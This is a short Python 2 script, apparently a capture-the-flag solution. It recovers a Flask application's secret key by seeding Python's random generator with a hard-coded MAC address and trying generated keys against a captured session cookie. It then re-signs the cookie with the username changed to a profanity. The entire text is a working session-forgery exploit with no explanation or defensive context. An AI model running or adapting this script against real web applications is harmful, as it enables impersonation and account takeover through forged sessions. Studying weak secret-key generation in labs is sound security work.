import flask_session_cookie_manager2
import random
mac = "02:42:ac:10:86:e1"
random.seed(int(mac.replace(":", ""), 16))
for x in range(1000):
    key = str(random.random() * 233)
    result = flask_session_cookie_manager2.FSCM.decode('eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.YMhtFA.btrKxk4Klji0LoZn6bnrH-USGmA', key)
    if 'error' not in result:
        result[u'username'] = 'fuck'
        print flask_session_cookie_manager2.FSCM.encode(key, str(result))
        exit()